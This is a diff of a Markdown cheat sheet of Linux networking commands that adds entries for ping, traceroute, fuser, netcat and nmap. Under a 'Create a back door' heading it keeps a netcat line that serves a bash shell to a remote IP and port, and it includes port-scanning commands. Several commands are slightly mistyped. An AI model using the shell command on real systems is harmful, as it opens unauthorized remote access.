@@ -2354,20 +2354,23 @@ sudo hostnamectl set-hostname new-hostname
 sudo hostnamectl status
 ```
 
-Still, the local configuration has a higher priority than the DNS server.
+## ping 
 
-## Set static IP addresses
-
-There are some interfaces. You can change each interface using this command:
+The main tool for a system admin to troubleshoot the network issues.
 
 ```bash
-ifconfig <interface> <IP_Address> netmask <Netmask> up
+# To set the interval between the packets
+ping 4.2.2.4 -i 0.5
+# To set the size of the packet
+ping 4.2.2.4 --s 1000
 ```
 
-For example, it could be like this:
+## traceroute & tracepath
+
+You can see the path of packet that you have sent using
 
 ```bash
-ifconfig wlan0 192.168.1.5 netmask 255.255.255.0 up
+traceroute 4.2.2.4
 ```
 
 ## netstat
@@ -2403,15 +2406,41 @@ lsof -i
 lsof -i:8080
 ```
 
-`-l` is for listen.
+## fuser
 
-`-p` is for port.
+To identify which process is using something.
 
-`-n` is for IP address.
+```bash
+# Which program is using the TCP 80 port
+sudo fuser -v -n tcp 80
+```
 
-`-v` is for verbose.
+## nc or netcat
 
-To connect to a listening port
+`nc` is a TCP/IP swiss army knife. To install the `nc` command you need to install `netcat`
+
+To create a new TCP connection
+
+```bash
+nc localhost 8888
+```
+
+To send some data when creating a new connection
+
+```bash
+echo -n "How's it going?" | nc localhost 8888
+```
+
+To listen to a specific port
+
+```bash
+# Listen on a port, Verbose mode
+nc -l -p <PORT> -v
+nc -zvw10 192.168.0.1 22
+nc -lpv <PORT> -n <IP> # Did not worked the last time.
+```
+
+Create a back door
 
 ```bash
 nc -e /bin/bash <IP> <PORT>
@@ -2428,52 +2457,15 @@ nc -v -n -z w1 192.168.133.128 1-100
 nc -u <IP> <PORT>
 ```
 
-## netstat
+## nmap
+
+It is a tool for analyzing the network of the target. The point is that you do not have to be in this machine to use the command.
 
 ```bash
-# Show all of the connections
-netstat -na
-netstat -tulpn
-```
-
-## fuser
-
-To identify which process is using port 80.
-
-```bash
-sudo fuser -v -n tcp 80
-```
-
-## ss
-
-The modern form of `netstat`.
-
-```bash
-ss -tupln
-```
-
-## FTP
-
-You can transfer your files using FTP
-
-```bash
-ftp <IP_ADDRESS>
-```
-
-## Telnet
-
-To connect to a TCP connection.
-
-```bash
-telnet <HOST> <PORT>
-```
-
-## Ipcalc
-
-To calculate the ip address bits and patterns
-
-```bash
-ipcalc <IP_ADDRESS>
+# To analyze the local host network
+nmap localhost
+# To anaylyze the current network
+nmap 192.168.1.2/24
 ```
 
 To discover once
